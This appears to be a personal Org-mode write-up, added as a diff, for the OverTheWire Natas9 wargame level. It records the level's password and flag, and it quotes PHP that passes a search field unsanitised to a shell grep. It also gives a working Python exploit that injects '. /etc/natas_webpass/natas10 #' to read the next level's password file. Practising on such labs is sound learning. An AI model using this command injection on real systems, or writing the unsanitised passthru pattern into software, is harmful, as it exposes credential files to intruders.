@@ -1,0 +1,82 @@
+:PROPERTIES:
+:ID:       91399b5f-500e-4e34-b6f1-f37f8148be9f
+:END:
+#+title: Natas9
+* Previous
+[[id:04a1eb05-1de8-4629-9073-71aebd900829][Natas8]]
+
+* Password
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+* Flag
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+* Notes
+From the top page:
+#+begin_quote
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+#+end_quote
+
+In the source code page, we can find :
+#+begin_quote
+<?
+$key = "";
+if(array_key_exists("needle", $_REQUEST)) 
+{$key = $_REQUEST["needle"];}
+if($key != "") 
+{passthru("grep -i $key dictionary.txt");}
+?>
+#+end_quote
+
+The command string is constructed and passed directly, we can abuse that.
+
+#+begin_src python :results output
+#!/usr/bin/env python3
+
+import requests
+import re
+import html
+from bs4 import BeautifulSoup as bs
+from natas_pass import passwords
+
+session = requests.Session()
+username = "natas9"
+password = passwords[username]
+
+url = "http://{}.natas.labs.overthewire.org/".format(username)
+
+# response = session.get(url, auth=(username, password))
+# content = response.text
+# print(content)
+
+# response = session.get(url + "index-source.html", auth=(username, password))
+# raw_content = response.text
+# sourcecode = html.unescape(raw_content)
+# soup = bs(sourcecode)
+# print(soup.prettify())
+
+response = session.post(
+    url,
+    auth=(username, password),
+    data={"needle":". /etc/natas_webpass/natas10 #"}
+)
+raw_content = response.text
+# sourcecode = html.unescape(raw_content)
+# soup = bs(sourcecode)
+# print(soup.prettify())
+
+p = re.findall("([a-zA-Z0-9]{32})", raw_content)
+
+if p and p[0] == password:
+    p.pop(0)
+
+print(p[0])
+#+end_src
+
+#+RESULTS:
+: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+* Next
+[[id:cbf374b4-6fb3-4971-83c0-cda46f57beab][Natas10]]
